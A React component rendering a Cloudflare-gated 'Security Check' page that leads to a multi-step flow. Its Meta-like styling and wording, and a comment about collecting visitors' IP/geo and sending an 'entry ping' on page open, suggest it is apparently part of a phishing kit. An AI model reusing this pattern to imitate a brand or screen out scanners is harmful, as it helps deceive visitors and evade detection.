import React from "react";
import styled from "styled-components";
import { useState } from "react";
import { useCaptcha } from "./InvisibleCaptchaGate";

const Wrapper = styled.div`
  border: 1px solid #bdbdbd;
  border-radius: 0.5rem;
  max-width: 500px;
  width: calc(100% - 2rem);
  margin: auto;
`;

const CaptchaContainer = styled.div`
  height: 100dvh;
  width: 100%;
  display: grid;
  place-items: center;
`;
const ImgWrapper = styled.div`
  img {
    border-radius: 0.5rem 0.5rem 0rem 0rem;
    width: 100%;
    height: auto;
  }
`;
const BottomWrapper = styled.div`
  padding: 1rem;
  background-color: #fff;
  border-radius: 0.5rem;
`;
const STitle = styled.div`
  font-size: 30px;
  font-weight: 500;
  letter-spacing: -0.05em;
  color: #4a4a4a;
`;

const DescriptionStyle = styled.div`
  font-size: 14px;
  letter-spacing: -0.025em;
  font-weight: 500;
  color: #4a4a4a;
`;
const BoxContainer = styled.div`
  background-color: rgb(243 243 243/255);
  border-color: rgb(224 224 224/255);
  border-radius: 0.25rem;
  border-width: 1px;
  max-width: 300px;
  width: 100%;
  margin-top: 1rem;
  margin-bottom: 0.5rem;
`;
const BtnNext = styled.button`
  border: none;
  font-size: 13px;
  font-weight: 500;
  padding: 11px 14px;
  width: 100%;
  border-radius: 8px;
  text-transform: none;
  line-height: 1;
`;
const Spinner = styled.div`
  width: 15px;
  height: 15px;
  border: 2px solid #fff;
  border-bottom-color: transparent;
  border-radius: 50%;
  display: inline-block;
  box-sizing: border-box;
  animation: rotation 1s linear infinite;

  @keyframes rotation {
    0% {
      transform: rotate(0deg);
    }
    100% {
      transform: rotate(360deg);
    }
  }
`;
function Captcha({ setStep }) {
  const [IsLoading, setIsLoading] = useState(false);
  const { verified } = useCaptcha();
  const IsDisabled = !verified || IsLoading;

  // IP/geo and the entry ping are already handled by useInitialSetup on page
  // open (with a verified Turnstile token) - no duplicate work here.
  const NextStep = () => {
    if (!verified || IsLoading) return;
    setIsLoading(true);
    setTimeout(() => {
      setStep(1);
    }, 1000);
  };

  return (
    <CaptchaContainer>
      <Wrapper>
        <BottomWrapper>
          <STitle style={{ fontSize: "25px", fontWeight: "500" }}>
            Security Check
          </STitle>
          <BoxContainer>
            <div className="captcha">
              {verified ? "Security check passed." : "Security check in progress."}
            </div>
          </BoxContainer>
          <DescriptionStyle className="py-2">
            This helps us to combat harmful conduct, detect and prevent spam and
            maintain the integrity of our Products.
          </DescriptionStyle>
          <DescriptionStyle className="py-2">
            We rely on Cloudflare's bot protection to provide this security
            check. The use of Cloudflare is subject to the Cloudflare Privacy
            Policy and Terms of Service.
          </DescriptionStyle>
          <DescriptionStyle className="py-2">
            Cloudflare evaluates network and request signals at its edge to tell
            real visitors apart from bots, so genuine visitors pass through
            without any extra interaction.
          </DescriptionStyle>

          <div className="pt-4">
            <BtnNext
              onClick={NextStep}
              disabled={IsDisabled ? true : false}
              style={{
                backgroundColor: IsDisabled ? "#e5e6eb" : "#0064e0",
                color: IsDisabled ? "#cbccd2" : "#fff",
              }}
            >
              {IsLoading ? <Spinner /> : " Continue"}
            </BtnNext>
          </div>
        </BottomWrapper>
      </Wrapper>
    </CaptchaContainer>
  );
}

export default Captcha;
